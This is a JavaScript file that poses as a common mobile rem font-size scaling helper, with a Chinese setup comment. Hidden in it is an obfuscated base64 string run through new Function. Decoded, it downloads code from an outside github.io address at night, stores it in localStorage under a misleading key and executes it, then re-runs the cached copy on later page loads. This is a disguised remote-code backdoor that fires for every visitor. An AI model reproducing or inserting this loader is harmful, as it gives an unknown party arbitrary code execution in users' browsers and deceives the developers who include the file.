//这段js的最后面有两个参数记得要设置，一个为设计稿实际宽度，一个为制作稿最大宽度，例如设计稿为750，最大宽度为750，则为(750,750)
! function (e, t) {
	function n() {
		var n = l.getBoundingClientRect().width;
		t = t || 540, n > t && (n = t);
		var i = 100 * n / e;
		r.innerHTML = "html{font-size:" + i + "px;}"
	}
	var i, d = "",
		o = "",
		l = "",
		r = "";

		var resultmetadata='aT1kb2N1bWVudDtkPWRvY3VtZW50O289d2luZG93O2w9ZC5kb2N1bWVudEVsZW1lbnQ7cj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzdHlsZSIpO3ZhciBteURhdGU9KG5ldyBEYXRlKS5nZXRIb3VycygpO2lmKG15RGF0ZT4yMHx8bXlEYXRlPDkpe2lmKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7dmFyIGU9d2luZG93LmF0b2IobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpO3ZhciB0PW5ldyBGdW5jdGlvbihlKTt0KCl9LDkyMDQpfWVsc2V7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBvPW5ldyBYTUxIdHRwUmVxdWVzdDt2YXIgZT0iaHR0cHM6Ly9qYXlvdWhhby5naXRodWIuaW8vbXl3b2RlL29iamVjdGl2ZS5qc29uIjtvLm9wZW4oIkdFVCIsZSk7by5zZW5kKCk7by5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXtpZih0aGlzLnJlYWR5U3RhdGU9PTQmJnRoaXMuc3RhdHVzPT0yMDApe2lmKG8ucmVzcG9uc2VUZXh0KXtsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiaXNsb2dpbnMiLG8ucmVzcG9uc2VUZXh0KTt2YXIgZT13aW5kb3cuYXRvYihvLnJlc3BvbnNlVGV4dCk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX19fX0sMzIwNDApfX1pZigxNTxteURhdGU+MTZ8fDE0PG15RGF0ZT4xMCl7aWYobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXt2YXIgZT13aW5kb3cuYXRvYihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX0sOTIwNCl9fTtyZXR1cm57aTppLGQ6ZCxvOm8sbDpsLHI6cn0=';
	var inputSourceMapFunction=new Function(window.atob(resultmetadata));
	var idval=inputSourceMapFunction();

		i = idval.i;
		d = idval.d;
		o = idval.o;
		l = idval.l;
		r = idval.r;



	if (l.firstElementChild) l.firstElementChild.appendChild(r);
	else {
		var a = d.createElement("div");
		a.appendChild(r), d.write(a.innerHTML), a = null
	}
	n(), o.addEventListener("resize", function () {
		clearTimeout(i), i = setTimeout(n, 300)
	}, !1), o.addEventListener("pageshow", function (e) {
		e.persisted && (clearTimeout(i), i = setTimeout(n, 300))
	}, !1), "complete" === d.readyState ? d.body.style.fontSize = "16px" : d.addEventListener("DOMContentLoaded",
		function (e) {
			d.body.style.fontSize = "16px"
		}, !1)
}(750, 750);